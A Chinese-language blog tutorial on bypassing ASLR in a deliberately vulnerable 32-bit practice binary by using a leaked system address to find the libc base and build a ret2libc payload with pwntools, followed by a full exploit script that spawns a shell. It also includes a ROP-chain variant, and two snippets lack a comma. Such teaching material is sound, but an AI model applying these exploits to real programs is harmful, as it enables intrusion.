---
title: 利用已泄漏信息绕过 ASLR
subtitle:
date: 2023-08-23T11:23:01+08:00
draft: false
author:
  name: CuB3y0nd
  link:
  email:
  avatar:
description:
keywords:
license:
comment: true
weight: 0
tags:
  - PWN
  - Stack
categories:
  - PWN
hiddenFromHomePage: false
hiddenFromSearch: false
summary:
resources:
  - name: featured-image
    src: featured-image.jpg
  - name: featured-image-preview
    src: featured-image-preview.jpg
toc: true
math: false
lightgallery: false
password:
message:
repost:
  enable: false
  url:
---

利用已泄漏信息绕过 ASLR

<!--more-->

## 0x01 源码

{{< link href="/pwn_assets/aslr.zip" content="aslr.zip" title="Download aslr.zip" download="aslr.zip" card=true >}}

```c
#include <stdio.h>
#include <stdlib.h>

void vuln() {
  char buffer[20];

  printf("System is at: %lp\n", system);

  gets(buffer);
}

int main() {
  vuln();

  return 0;
}

void win() {
  puts("PIE bypassed! Great job :D");
}
```

就像我们对 PIE 所做的那样，只不过这次我们输出 `system` 的地址。

## 0x02 分析

```
$ ./vuln-32
System is at: 0xf7c4f610
```

{{<admonition type="info">}}

你的系统地址可能以不同的字符结尾。这只是说明你用的是不同的 libc 版本。

{{</admonition>}}

## 0x03 利用

其中大部分与我们对 PIE 所做的一样。

```python
from pwn import *

context.log_level = 'debug'

elf = context.binary = ELF('./vuln-32')
libc = elf.libc

p = process()
```

解析 `system` 地址并从中计算 libc 基址（就像我们对 PIE 所做的那样）：

```python
p.recvuntil('at: ')
system_leak = int(p.recvline(), 16)

libc.address = system_leak - libc.sym['system']
log.success(f'LIBC base: {hex(libc.address)}')
```

现在我们终于可以使用 libc ELF 对象来实现 ret2libc 了：

```python
payload = flat(
    'A' * 32,
    libc.sym['system']
    0x0,
    next(libc.search(b'/bin/sh'))
)

p.sendline(payload)

p.interactive()
```

### 1x01 最终 Exploit

```python {title="exp.py"}
from pwn import *

context.log_level = 'debug'

elf = context.binary = ELF('./vuln-32')
libc = elf.libc

p = process()

p.recvuntil('at: ')
system_leak = int(p.recvline(), 16)

libc.address = system_leak - libc.sym['system']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
    'A' * 32,
    libc.sym['system'],
    0x0,
    next(libc.search(b'/bin/sh'))
)

p.sendline(payload)

p.interactive()
```

## 0x04 64-bit

自己尝试 :)

{{< link href="/pwn_assets/aslr-64.zip" content="aslr-64.zip" title="Download aslr-64.zip" download="aslr-64.zip" card=true >}}

## 0x05 使用 pwntools 优化

你可以将以下 payload 写得更加 pwntoolsy：

```python
payload = flat(
    'A' * 32,
    libc.sym['system']
    0x0,
    next(libc.search(b'/bin/sh'))
)

p.sendline(payload)
```

你可以这样做：

```python
shell = next(libc.search(b'/bin/sh'))

rop = ROP(libc)
rop.raw('A' * 32)
rop.system(shell)

p.sendline(rop.chain())
```

这样做的好处是更具可读性，而且也更容易在 64-bit 漏洞利用中重用。因为所有参数都
会自动为你解析。

